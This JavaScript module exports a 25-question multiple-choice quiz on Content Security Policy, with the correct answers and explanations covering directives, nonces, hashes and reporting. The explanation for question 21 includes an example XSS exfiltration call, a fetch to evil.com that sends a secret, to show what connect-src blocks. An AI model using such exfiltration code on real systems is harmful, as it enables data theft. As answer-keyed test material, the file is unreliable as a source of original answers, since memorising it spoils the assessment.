module.exports = {
  "metadata": {
    "title": "Content Security Policy (CSP) Basics",
    "description": "Comprehensive coverage of Content Security Policy fundamentals including meta tag syntax, directives, nonce and hash-based implementations, security benefits, and common configuration patterns for protecting web applications.",
    "difficulty": "medium",
    "domain": "html",
    "timeLimit": 45,
    "questionCount": 25,
    "topics": [
      "CSP Meta Tag Syntax",
      "default-src Directive",
      "script-src Directive",
      "style-src Directive",
      "Nonce-based CSP",
      "Hash-based CSP",
      "CSP Security Benefits",
      "Common CSP Configurations"
    ],
    "topicLinks": [
      {
        "topicName": "CSP Meta Tag Syntax",
        "refLink": "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"
      },
      {
        "topicName": "default-src Directive",
        "refLink": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/default-src"
      },
      {
        "topicName": "script-src Directive",
        "refLink": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src"
      },
      {
        "topicName": "style-src Directive",
        "refLink": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/style-src"
      },
      {
        "topicName": "Nonce-based CSP",
        "refLink": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/Sources#sources"
      },
      {
        "topicName": "Hash-based CSP",
        "refLink": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/Sources#sources"
      },
      {
        "topicName": "CSP Security Benefits",
        "refLink": "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"
      },
      {
        "topicName": "Common CSP Configurations",
        "refLink": "https://content-security-policy.com/"
      }
    ],
    "assessmentId": 14,
    "assessmentUniqueId": 1763033136010,
    "testType": "multiple-choice"
  },
  "questions": [
    {
      "id": 1,
      "question": "What is the primary purpose of Content Security Policy (CSP)?",
      "options": {
        "A": "To protect against Cross-Site Scripting (XSS) and other code injection attacks by controlling which resources can be loaded",
        "B": "To improve website performance by optimizing resource loading",
        "C": "To encrypt all data transmitted between the browser and server",
        "D": "To automatically sanitize user input on forms"
      },
      "correct": "A",
      "explanation": "Content Security Policy (CSP) is a security feature that helps protect websites from Cross-Site Scripting (XSS), clickjacking, and other code injection attacks. It works by allowing developers to specify which sources of content (scripts, stylesheets, images, etc.) are trusted and can be loaded by the browser. When CSP is enabled, the browser will only execute or load resources from approved sources, blocking any unauthorized scripts or content. This prevents attackers from injecting malicious scripts into your pages. CSP doesn't handle performance optimization, encryption (that's HTTPS/TLS), or input sanitization (which should still be done server-side). It's a declarative whitelist-based security layer that adds defense-in-depth to your application.",
      "topics": [
        "CSP Security Benefits"
      ]
    },
    {
      "id": 2,
      "question": "How do you implement CSP using an HTML meta tag?",
      "options": {
        "A": "<pre><meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self'\"></pre>",
        "B": "<pre><meta name=\"csp\" content=\"default-src 'self'\"></pre>",
        "C": "<pre><meta property=\"content-security-policy\" content=\"default-src 'self'\"></pre>",
        "D": "<pre><csp policy=\"default-src 'self'\"></csp></pre>"
      },
      "correct": "A",
      "explanation": "The correct syntax for implementing CSP via a meta tag is <pre><meta http-equiv=\"Content-Security-Policy\" content=\"policy-directives\"></pre>. The <pre>http-equiv</pre> attribute simulates an HTTP response header, and the <pre>content</pre> attribute contains the actual CSP directives. For example: <pre><meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self'; script-src 'self' https://cdn.example.com\"></pre>. While CSP is commonly set via HTTP headers (which is more secure and flexible), the meta tag approach works when you can't control server headers. Note that some CSP features like <pre>frame-ancestors</pre> and <pre>report-uri</pre> don't work in meta tags. There's no <pre>name=\"csp\"</pre> or <pre>property</pre> attribute approach, and <pre><csp></pre> isn't a valid HTML element.",
      "topics": [
        "CSP Meta Tag Syntax"
      ]
    },
    {
      "id": 3,
      "question": "What does the <pre>default-src</pre> directive do in a CSP policy?",
      "options": {
        "A": "It specifies the default encryption method for all resources",
        "B": "It enables CSP in default mode with recommended settings",
        "C": "It defines the default script source only",
        "D": "It serves as a fallback for all fetch directives that aren't explicitly specified"
      },
      "correct": "D",
      "explanation": "The <pre>default-src</pre> directive serves as a fallback or default for all other fetch directives that aren't explicitly defined in the policy. Fetch directives include <pre>script-src</pre>, <pre>style-src</pre>, <pre>img-src</pre>, <pre>font-src</pre>, <pre>connect-src</pre>, and others. For example, with <pre>default-src 'self'</pre>, all resources (scripts, styles, images, fonts, AJAX requests) can only be loaded from the same origin unless you override a specific directive. If you add <pre>script-src https://cdn.example.com</pre>, scripts can load from that CDN, but everything else still follows the <pre>default-src</pre> policy. This provides a convenient way to set a baseline security policy. It doesn't relate to encryption, doesn't only apply to scripts, and isn't about CSP modes—it's purely about providing default values for resource loading policies.",
      "topics": [
        "default-src Directive",
        "Common CSP Configurations"
      ]
    },
    {
      "id": 4,
      "question": "What does <pre>'self'</pre> mean in a CSP directive like <pre>script-src 'self'</pre>?",
      "options": {
        "A": "Scripts can be loaded from any HTTPS source",
        "B": "Scripts can only be loaded from the same origin (same protocol, domain, and port)",
        "C": "Only inline scripts are allowed",
        "D": "Scripts can reference themselves recursively"
      },
      "correct": "B",
      "explanation": "The <pre>'self'</pre> keyword (note the single quotes are required) means resources can only be loaded from the same origin—the same protocol (http/https), domain, and port as the document itself. For example, if your page is at <pre>https://example.com</pre>, <pre>script-src 'self'</pre> allows scripts from <pre>https://example.com/js/app.js</pre> but blocks <pre>https://other.com/script.js</pre>, <pre>http://example.com/script.js</pre> (different protocol), and <pre>https://example.com:8080/script.js</pre> (different port). This is one of the most common and secure CSP configurations, as it restricts resources to your own domain. The quotes around 'self' are mandatory—without them, the browser would interpret it as a hostname. <pre>'self'</pre> doesn't allow HTTPS from anywhere, doesn't relate to inline scripts (that's <pre>'unsafe-inline'</pre>), and has nothing to do with recursion.",
      "topics": [
        "script-src Directive",
        "Common CSP Configurations"
      ]
    },
    {
      "id": 5,
      "question": "Why is <pre>'unsafe-inline'</pre> considered unsafe in CSP?",
      "options": {
        "A": "It slows down page rendering performance",
        "B": "It allows loading resources over HTTP instead of HTTPS",
        "C": "It enables deprecated HTML features",
        "D": "It allows inline scripts and styles, which defeats the main XSS protection that CSP provides"
      },
      "correct": "D",
      "explanation": "The <pre>'unsafe-inline'</pre> keyword allows inline scripts (<pre><script>code here</script></pre>) and inline event handlers (<pre>onclick=\"...\"</pre>) or inline styles. This is considered unsafe because XSS attacks typically inject inline scripts into pages. By blocking inline scripts by default, CSP prevents most XSS attacks. When you add <pre>'unsafe-inline'</pre>, you're essentially disabling one of CSP's primary protections. If an attacker can inject <pre><script>malicious code</script></pre> into your page, CSP won't stop it if <pre>'unsafe-inline'</pre> is enabled. Instead of using <pre>'unsafe-inline'</pre>, use nonces or hashes for legitimate inline scripts, or move scripts to external files. The keyword doesn't affect performance, deprecated features, or HTTP vs HTTPS (that's <pre>upgrade-insecure-requests</pre> or <pre>block-all-mixed-content</pre>).",
      "topics": [
        "script-src Directive",
        "CSP Security Benefits"
      ]
    },
    {
      "id": 6,
      "question": "How does nonce-based CSP work?",
      "options": {
        "A": "It generates random numbers for each resource request",
        "B": "It allows scripts to execute only once",
        "C": "It encrypts all scripts with a nonce key",
        "D": "The server generates a unique random value per page load, includes it in the CSP header, and adds matching nonce attributes to approved inline scripts"
      },
      "correct": "D",
      "explanation": "Nonce-based CSP uses a cryptographically random value (nonce = number used once) that changes with each page load. The server generates a unique nonce, includes it in the CSP header (<pre>script-src 'nonce-abc123'</pre>), and adds the same nonce to trusted inline scripts via a <pre>nonce</pre> attribute: <pre><script nonce=\"abc123\">/* safe code */</script></pre>. The browser will only execute inline scripts whose nonce matches the one in the CSP policy. Since attackers can't predict or access the nonce value, injected scripts without the correct nonce won't execute. The nonce must be random, unpredictable, and unique per page load. This allows legitimate inline scripts while blocking injected ones. Nonces don't encrypt anything, don't relate to execution limits, and aren't about resource requests—they're purely about authorizing specific inline content.",
      "topics": [
        "Nonce-based CSP",
        "script-src Directive"
      ]
    },
    {
      "id": 7,
      "question": "What is hash-based CSP and how is it used?",
      "options": {
        "A": "It hashes user passwords for security",
        "B": "It allows specific inline scripts by whitelisting their cryptographic hash in the CSP policy",
        "C": "It compresses scripts using hash algorithms",
        "D": "It creates hashtags for social media sharing"
      },
      "correct": "B",
      "explanation": "Hash-based CSP allows you to whitelist specific inline scripts or styles by including their cryptographic hash in the CSP policy. You calculate the hash (SHA-256, SHA-384, or SHA-512) of the exact script content and add it to the policy: <pre>script-src 'sha256-abc123...'</pre>. Only inline scripts whose content exactly matches that hash will execute. For example, if your inline script is <pre><script>console.log('hello')</script></pre>, you'd hash just the <pre>console.log('hello')</pre> part and include that hash. This is useful for static inline scripts that don't change. Unlike nonces (which change per page load), hashes remain constant for the same script. Browser developer tools can help generate hashes. This approach doesn't relate to password hashing, compression, or social media—it's purely about authorizing specific inline code by its cryptographic fingerprint.",
      "topics": [
        "Hash-based CSP",
        "script-src Directive"
      ]
    },
    {
      "id": 8,
      "question": "What does the <pre>script-src</pre> directive control?",
      "options": {
        "A": "Only external JavaScript files from <pre><script src></pre> tags",
        "B": "Only inline JavaScript code",
        "C": "All JavaScript execution including external scripts, inline scripts, eval(), and inline event handlers",
        "D": "JavaScript compilation and optimization settings"
      },
      "correct": "C",
      "explanation": "The <pre>script-src</pre> directive controls all sources of JavaScript execution, which includes: external scripts loaded via <pre><script src=\"...\"></pre>, inline <pre><script></pre> blocks, inline event handlers like <pre>onclick=\"...\"</pre>, <pre>eval()</pre> and similar functions (<pre>setTimeout(string)</pre>, <pre>setInterval(string)</pre>, <pre>new Function()</pre>), and <pre>javascript:</pre> URLs. By default (without <pre>'unsafe-inline'</pre> or <pre>'unsafe-eval'</pre>), CSP blocks inline scripts and eval-like constructs even if external scripts are allowed. You might have <pre>script-src 'self' https://cdn.example.com</pre> to allow scripts from your domain and a CDN, while still blocking inline code unless you add nonces/hashes. The directive doesn't only apply to certain script types or control compilation settings—it comprehensively governs JavaScript execution sources.",
      "topics": [
        "script-src Directive",
        "CSP Security Benefits"
      ]
    },
    {
      "id": 9,
      "question": "What does the <pre>style-src</pre> directive control?",
      "options": {
        "A": "All CSS sources including external stylesheets, inline <pre><style></pre> blocks, and inline style attributes",
        "B": "Only CSS files loaded via <pre><link></pre> tags",
        "C": "CSS preprocessor settings",
        "D": "Visual styling preferences for the browser"
      },
      "correct": "A",
      "explanation": "The <pre>style-src</pre> directive controls all CSS sources: external stylesheets via <pre><link rel=\"stylesheet\"></pre>, inline <pre><style></pre> blocks, and inline <pre>style=\"...\"</pre> attributes on elements. Just like <pre>script-src</pre>, it blocks inline styles by default unless you use <pre>'unsafe-inline'</pre>, nonces, or hashes. For example, <pre>style-src 'self'</pre> allows stylesheets from your origin but blocks <pre><style>body{color:red}</style></pre> and <pre><div style=\"color:red\"></div></pre> unless you add nonce/hash support. You might use <pre>style-src 'self' 'nonce-xyz123'</pre> and add <pre>nonce=\"xyz123\"</pre> to trusted inline styles. This directive doesn't relate to CSS preprocessors (Sass, Less) or browser styling preferences—it's purely about controlling CSS sources for security, preventing attackers from injecting malicious styles.",
      "topics": [
        "style-src Directive"
      ]
    },
    {
      "id": 10,
      "question": "What happens when a resource violates the CSP policy?",
      "options": {
        "A": "The page displays a warning but loads the resource anyway",
        "B": "The resource is loaded from a fallback CDN",
        "C": "The browser blocks the resource from loading and logs a violation to the console",
        "D": "The entire page fails to load"
      },
      "correct": "C",
      "explanation": "When a resource violates the CSP policy, the browser blocks it from loading/executing and logs a violation message to the browser console. For example, if your policy is <pre>script-src 'self'</pre> and the page tries to load <pre>https://evil.com/script.js</pre>, the browser blocks it and shows an error like \"Refused to load script because it violates the Content Security Policy directive\". The page continues loading—only the violating resource is blocked, not the entire page. If you've configured a <pre>report-uri</pre> or <pre>report-to</pre> directive, the browser can also send violation reports to your server for monitoring. This helps you track attempted attacks or find legitimate resources you forgot to whitelist. There's no warning that allows loading anyway, no automatic fallback CDNs, and the page doesn't completely fail—CSP gracefully blocks only the problematic resources.",
      "topics": [
        "CSP Security Benefits",
        "Common CSP Configurations"
      ]
    },
    {
      "id": 11,
      "question": "Can you use multiple sources in a single CSP directive?",
      "options": {
        "A": "No, each directive can only have one source",
        "B": "Yes, but only two sources maximum",
        "C": "Yes, list them separated by spaces: <pre>script-src 'self' https://cdn.example.com https://analytics.example.com</pre>",
        "D": "Yes, separated by commas"
      },
      "correct": "C",
      "explanation": "You can specify multiple sources in a single directive by separating them with spaces. For example: <pre>script-src 'self' https://cdn.example.com https://analytics.example.com 'nonce-abc123'</pre> allows scripts from your origin, two CDNs, and inline scripts with the matching nonce. Each source is space-separated, and you can mix different types of sources (origins, keywords like <pre>'self'</pre>, nonces, hashes, etc.) in the same directive. There's no limit to the number of sources you can specify. Commas are not used to separate sources within a directive—commas would be invalid syntax. This flexibility allows you to create precise policies that whitelist exactly the sources you need while blocking everything else, balancing security with functionality.",
      "topics": [
        "Common CSP Configurations",
        "script-src Directive"
      ]
    },
    {
      "id": 12,
      "question": "What is the difference between setting CSP via HTTP header versus meta tag?",
      "options": {
        "A": "They are functionally identical with no differences",
        "B": "HTTP headers only work on servers, while meta tags work everywhere",
        "C": "Meta tags are faster and more efficient",
        "D": "HTTP headers are more secure and support all CSP features; meta tags can't use some directives like frame-ancestors or report-uri"
      },
      "correct": "D",
      "explanation": "CSP via HTTP headers is the preferred and more powerful method. Some CSP directives don't work in meta tags, including <pre>frame-ancestors</pre> (prevents clickjacking), <pre>report-uri</pre>/<pre>report-to</pre> (violation reporting), and <pre>sandbox</pre>. HTTP headers are also more secure because they're set before the HTML is parsed, while meta tags are parsed as part of the HTML (making them vulnerable if an attacker can inject content before the meta tag). HTTP headers can be set on all responses, while meta tags only apply to HTML documents. However, meta tags are useful when you can't control server configuration (like on static hosting or some CMS platforms). For maximum security, use HTTP headers when possible. Meta tags serve as a fallback but with limitations. They're not faster or more efficient—just more accessible in certain hosting environments.",
      "topics": [
        "CSP Meta Tag Syntax",
        "CSP Security Benefits"
      ]
    },
    {
      "id": 13,
      "question": "What does <pre>script-src 'unsafe-eval'</pre> allow?",
      "options": {
        "A": "All inline scripts including event handlers",
        "B": "JavaScript features like eval(), new Function(), setTimeout(string), and setInterval(string)",
        "C": "Loading scripts from any external source",
        "D": "Automatic error recovery for script failures"
      },
      "correct": "B",
      "explanation": "The <pre>'unsafe-eval'</pre> keyword allows JavaScript features that dynamically evaluate strings as code: <pre>eval()</pre>, <pre>new Function()</pre>, <pre>setTimeout(string)</pre>, <pre>setInterval(string)</pre>, and similar constructs. By default, CSP blocks these even when external scripts are allowed, because they can execute arbitrary code from strings, which is risky if an attacker can control those strings. Many modern frameworks and libraries have eliminated their use of eval, making <pre>'unsafe-eval'</pre> unnecessary. If you're using older libraries that require eval, you might need to add <pre>'unsafe-eval'</pre>, but consider updating those dependencies instead. This keyword is separate from <pre>'unsafe-inline'</pre> (which allows inline scripts). It doesn't allow external sources or provide error recovery—it specifically enables eval-like dynamic code execution.",
      "topics": [
        "script-src Directive",
        "CSP Security Benefits"
      ]
    },
    {
      "id": 14,
      "question": "How do you allow scripts from a specific domain in CSP?",
      "options": {
        "A": "Add the domain name without protocol: <pre>script-src example.com</pre>",
        "B": "Use <pre>script-src domain=\"example.com\"</pre>",
        "C": "Use <pre>script-src allow:https://example.com</pre>",
        "D": "Add the full URL including protocol: <pre>script-src https://example.com</pre>"
      },
      "correct": "D",
      "explanation": "To whitelist a specific domain, include the full scheme and host: <pre>script-src https://example.com</pre>. This allows scripts from <pre>https://example.com</pre> and any path on that domain. You can also specify paths: <pre>https://example.com/js/</pre> allows only scripts from that directory. If you omit the protocol and just write <pre>example.com</pre>, it matches both HTTP and HTTPS from that domain, which is less secure. You can use wildcards for subdomains: <pre>https://*.example.com</pre> allows all subdomains. The format is just the URL with scheme; there's no <pre>allow:</pre> prefix or <pre>domain=</pre> attribute syntax. Be specific with protocols—use HTTPS when possible. Multiple domains are space-separated: <pre>script-src https://cdn1.com https://cdn2.com</pre>.",
      "topics": [
        "script-src Directive",
        "Common CSP Configurations"
      ]
    },
    {
      "id": 15,
      "question": "What is a common, secure baseline CSP policy for a simple website?",
      "options": {
        "A": "<pre>default-src *</pre>",
        "B": "<pre>default-src 'self'</pre>",
        "C": "<pre>default-src 'none'</pre>",
        "D": "<pre>script-src 'unsafe-inline'; style-src 'unsafe-inline'</pre>"
      },
      "correct": "B",
      "explanation": "A secure baseline CSP for simple websites is <pre>default-src 'self'</pre>, which allows all resource types (scripts, styles, images, fonts, etc.) only from the same origin. This provides strong XSS protection while allowing your site's own resources to load normally. From this baseline, you can add specific directives for external resources you need: <pre>default-src 'self'; img-src 'self' https://images.cdn.com; script-src 'self' https://analytics.com</pre>. The option <pre>default-src *</pre> allows everything from everywhere, providing no security. <pre>default-src 'none'</pre> blocks everything, which is too restrictive (though useful as a starting point to build up from). Using <pre>'unsafe-inline'</pre> for scripts and styles defeats CSP's main purpose. Start with <pre>'self'</pre> and add exceptions as needed, always preferring nonces/hashes over <pre>'unsafe-inline'</pre>.",
      "topics": [
        "Common CSP Configurations",
        "default-src Directive"
      ]
    },
    {
      "id": 16,
      "question": "What does the <pre>img-src</pre> directive control?",
      "options": {
        "A": "All image sources including <pre><img></pre>, CSS background-image, favicons, and other image contexts",
        "B": "Only <pre><img></pre> tag sources",
        "C": "Image compression and optimization settings",
        "D": "Alternative text for images"
      },
      "correct": "A",
      "explanation": "The <pre>img-src</pre> directive controls all contexts where images can be loaded: <pre><img src></pre> tags, CSS <pre>background-image</pre> and similar properties, favicons (<pre><link rel=\"icon\"></pre>), <pre>srcset</pre> and <pre><picture></pre> elements, and other image-loading contexts. For example, <pre>img-src 'self' https://images.cdn.com</pre> allows images from your origin and the CDN in all these contexts. If you have <pre>img-src 'self'</pre> and try to use a CSS background image from an external CDN, it will be blocked. Data URIs (<pre>data:</pre> scheme) require explicit permission: <pre>img-src 'self' data:</pre>. The directive doesn't control image optimization, compression, or accessibility features like alt text—it's purely about controlling which sources images can be loaded from for security purposes.",
      "topics": [
        "Common CSP Configurations"
      ]
    },
    {
      "id": 17,
      "question": "How should you generate nonces for CSP?",
      "options": {
        "A": "Use a static value that's the same for all page loads",
        "B": "Use the user's session ID",
        "C": "Use the current timestamp",
        "D": "Generate a cryptographically random value that's unique for each page load"
      },
      "correct": "D",
      "explanation": "Nonces must be cryptographically random and unique for each page load. Generate them server-side using a cryptographically secure random number generator (like Node's <pre>crypto.randomBytes()</pre>, PHP's <pre>random_bytes()</pre>, or similar). The nonce should be at least 128 bits of randomness, typically encoded as base64. For example: generate a random value, encode it, include it in the CSP header as <pre>'nonce-abc123xyz'</pre>, and add <pre>nonce=\"abc123xyz\"</pre> to your inline scripts. Never reuse the same nonce across requests—attackers could predict it. Don't use timestamps, session IDs, or other predictable values, as they can be guessed or discovered. The randomness and uniqueness are what make nonces secure: attackers can't inject scripts with the correct nonce because they can't predict the value.",
      "topics": [
        "Nonce-based CSP",
        "CSP Security Benefits"
      ]
    },
    {
      "id": 18,
      "question": "What is CSP's <pre>report-uri</pre> directive used for?",
      "options": {
        "A": "To specify where users should report website bugs",
        "B": "To redirect users when CSP violations occur",
        "C": "To specify a URL where the browser should send CSP violation reports",
        "D": "To report website analytics data"
      },
      "correct": "C",
      "explanation": "The <pre>report-uri</pre> directive (deprecated in favor of <pre>report-to</pre>) specifies a URL where the browser should send JSON reports when CSP violations occur. For example: <pre>default-src 'self'; report-uri /csp-violation-report</pre>. When a resource is blocked, the browser sends a POST request with details about the violation (blocked URI, violated directive, document URI, etc.) to your endpoint. This helps you monitor attacks, debug CSP issues, and discover legitimate resources you forgot to whitelist. The endpoint should accept and log these reports. Note that <pre>report-uri</pre> doesn't work in meta tags—only in HTTP headers. Users aren't redirected, and this isn't for user bug reports or analytics. Modern implementations prefer the <pre>report-to</pre> directive with the Reporting API.",
      "topics": [
        "Common CSP Configurations",
        "CSP Security Benefits"
      ]
    },
    {
      "id": 19,
      "question": "What does <pre>Content-Security-Policy-Report-Only</pre> mode do?",
      "options": {
        "A": "It enforces CSP and only sends reports without blocking",
        "B": "It only protects against reporting-related attacks",
        "C": "It doesn't enforce CSP but reports violations, allowing you to test policies without breaking functionality",
        "D": "It's a deprecated version of CSP"
      },
      "correct": "C",
      "explanation": "The <pre>Content-Security-Policy-Report-Only</pre> header (or <pre><meta http-equiv=\"Content-Security-Policy-Report-Only\"...</pre>) enables report-only mode, where CSP violations are reported but not enforced. Resources that would be blocked under normal CSP are allowed to load, but violations are still logged to the console and sent to your <pre>report-uri</pre> endpoint. This is invaluable for testing new CSP policies on production sites without risking broken functionality. You can see what would be blocked, adjust your policy, and deploy the enforcing version once you're confident. For example: <pre>Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-test</pre>. You can even run report-only and enforcing CSP simultaneously with different policies to test changes. It's not deprecated—it's a standard testing tool.",
      "topics": [
        "Common CSP Configurations",
        "CSP Security Benefits"
      ]
    },
    {
      "id": 20,
      "question": "Why can't <pre>frame-ancestors</pre> be used in CSP meta tags?",
      "options": {
        "A": "It's too complex for meta tag syntax",
        "B": "It needs to be processed before the page is parsed, which happens before meta tags are read",
        "C": "Meta tags don't support frame-related directives",
        "D": "frame-ancestors is deprecated"
      },
      "correct": "B",
      "explanation": "The <pre>frame-ancestors</pre> directive (which controls whether the page can be embedded in <pre><frame></pre>, <pre><iframe></pre>, or <pre><object></pre>) must be processed before the page is parsed to prevent clickjacking attacks. By the time the browser parses the HTML and reaches the meta tag, it may have already made decisions about embedding. HTTP headers are sent and processed before any HTML parsing begins, making them suitable for <pre>frame-ancestors</pre>. Other directives that don't work in meta tags include <pre>report-uri</pre>, <pre>report-to</pre>, and <pre>sandbox</pre> for similar timing reasons. The directive isn't deprecated or too complex—it's about when in the page lifecycle the policy needs to be enforced. For clickjacking protection via meta tags, you can't rely on CSP; use the <pre>X-Frame-Options</pre> header instead, though that also requires server configuration.",
      "topics": [
        "CSP Meta Tag Syntax",
        "CSP Security Benefits"
      ]
    },
    {
      "id": 21,
      "question": "What does <pre>connect-src</pre> directive control?",
      "options": {
        "A": "WebSocket and network connection security protocols",
        "B": "URLs that can be loaded using fetch(), XMLHttpRequest, WebSocket, EventSource, and similar APIs",
        "C": "Database connection strings",
        "D": "Physical network connectivity settings"
      },
      "correct": "B",
      "explanation": "The <pre>connect-src</pre> directive restricts URLs that JavaScript can connect to using <pre>fetch()</pre>, <pre>XMLHttpRequest</pre>, <pre>WebSocket</pre>, <pre>EventSource</pre>, <pre>navigator.sendBeacon()</pre>, and similar APIs. For example, <pre>connect-src 'self' https://api.example.com</pre> allows AJAX/fetch requests only to your own origin and the specified API. This prevents attackers from using XSS to exfiltrate data to external domains via AJAX. If an attacker injects code that tries to <pre>fetch('https://evil.com/steal?data=' + secret)</pre>, CSP blocks it if evil.com isn't in your <pre>connect-src</pre> list. This doesn't control encryption protocols (that's HTTPS/TLS), database connections (server-side concern), or physical connectivity. It's purely about JavaScript network APIs—a crucial defense against data exfiltration in XSS attacks.",
      "topics": [
        "Common CSP Configurations"
      ]
    },
    {
      "id": 22,
      "question": "Can you combine nonce-based and hash-based CSP for scripts?",
      "options": {
        "A": "No, you must choose one approach",
        "B": "Yes, you can use both: <pre>script-src 'nonce-abc123' 'sha256-xyz...'</pre>",
        "C": "Yes, but only for different script types",
        "D": "Combining them disables CSP"
      },
      "correct": "B",
      "explanation": "You can absolutely combine nonces and hashes in the same directive: <pre>script-src 'nonce-abc123' 'sha256-xyz789...'</pre>. This allows inline scripts with either the matching nonce OR the matching hash. This is useful when you have some dynamic inline scripts (use nonces) and some static inline scripts (use hashes). For example, you might use nonces for scripts that include user data or server-generated values, and hashes for static analytics or configuration scripts that never change. The browser will allow any inline script that has either the correct nonce or whose content matches one of the specified hashes. You're not limited to one approach or separated by script types, and combining them certainly doesn't disable CSP—it makes your policy more flexible while maintaining security.",
      "topics": [
        "Nonce-based CSP",
        "Hash-based CSP",
        "script-src Directive"
      ]
    },
    {
      "id": 23,
      "question": "What is the purpose of <pre>upgrade-insecure-requests</pre> directive?",
      "options": {
        "A": "It automatically upgrades HTTP requests to HTTPS when loading resources",
        "B": "It upgrades the CSP policy to the latest version",
        "C": "It improves performance by compressing requests",
        "D": "It updates outdated browser features"
      },
      "correct": "A",
      "explanation": "The <pre>upgrade-insecure-requests</pre> directive instructs the browser to automatically upgrade all HTTP requests to HTTPS before making them. For example, if your page tries to load <pre>http://example.com/image.jpg</pre>, the browser will automatically request <pre>https://example.com/image.jpg</pre> instead. This is useful when migrating from HTTP to HTTPS, as it helps prevent mixed content warnings and security issues when some hardcoded URLs or legacy content references still use HTTP. The directive is simply: <pre>Content-Security-Policy: upgrade-insecure-requests</pre> (no value needed). It doesn't upgrade CSP versions, improve performance, or update browser features—it's specifically about protocol upgrades for resource requests. This works alongside <pre>block-all-mixed-content</pre> which blocks rather than upgrades insecure requests.",
      "topics": [
        "Common CSP Configurations",
        "CSP Security Benefits"
      ]
    },
    {
      "id": 24,
      "question": "Which of the following is NOT a valid CSP directive?",
      "options": {
        "A": "<pre>video-src</pre>",
        "B": "<pre>media-src</pre>",
        "C": "<pre>font-src</pre>",
        "D": "<pre>object-src</pre>"
      },
      "correct": "A",
      "explanation": "The <pre>video-src</pre> directive doesn't exist in CSP. Video sources are controlled by the <pre>media-src</pre> directive, which handles both <pre><video></pre> and <pre><audio></pre> elements. Valid CSP fetch directives include: <pre>script-src</pre>, <pre>style-src</pre>, <pre>img-src</pre>, <pre>font-src</pre> (for web fonts), <pre>media-src</pre> (for video/audio), <pre>object-src</pre> (for <pre><object></pre>, <pre><embed></pre>, <pre><applet></pre>), <pre>connect-src</pre> (for AJAX/fetch), <pre>frame-src</pre> (for iframes), <pre>worker-src</pre> (for workers), <pre>manifest-src</pre> (for web app manifests), and others. If you need to control video sources specifically, use <pre>media-src https://videos.cdn.com</pre>. There's no separate directive for videos alone—media-src covers all audio and video content.",
      "topics": [
        "Common CSP Configurations"
      ]
    },
    {
      "id": 25,
      "question": "What is the best practice for implementing CSP on a new project?",
      "options": {
        "A": "Start with 'unsafe-inline' and 'unsafe-eval' for everything, then restrict gradually",
        "B": "Start with a strict policy like default-src 'none', add only what's needed, test with report-only mode first, then enforce",
        "C": "Copy CSP policies from other websites",
        "D": "Only implement CSP after the project is complete"
      },
      "correct": "B",
      "explanation": "The best practice is to start strict and relax as needed. Begin with a restrictive baseline like <pre>default-src 'none'</pre> or <pre>default-src 'self'</pre>, then add specific directives for resources you actually need. Use <pre>Content-Security-Policy-Report-Only</pre> to test without breaking functionality—monitor violation reports and adjust your policy. Once confident, switch to enforcing mode. For inline scripts/styles, prefer nonces or hashes over <pre>'unsafe-inline'</pre>. Document your CSP decisions and review regularly. Starting with unsafe directives defeats the purpose—you'd be adding security holes from the beginning. Copying from other sites is risky because their needs differ from yours. Implementing CSP during development (not after completion) is ideal, as retrofitting CSP onto existing projects with inline scripts everywhere is much harder. Build security in from the start.",
      "topics": [
        "Common CSP Configurations",
        "CSP Security Benefits"
      ]
    }
  ]
}
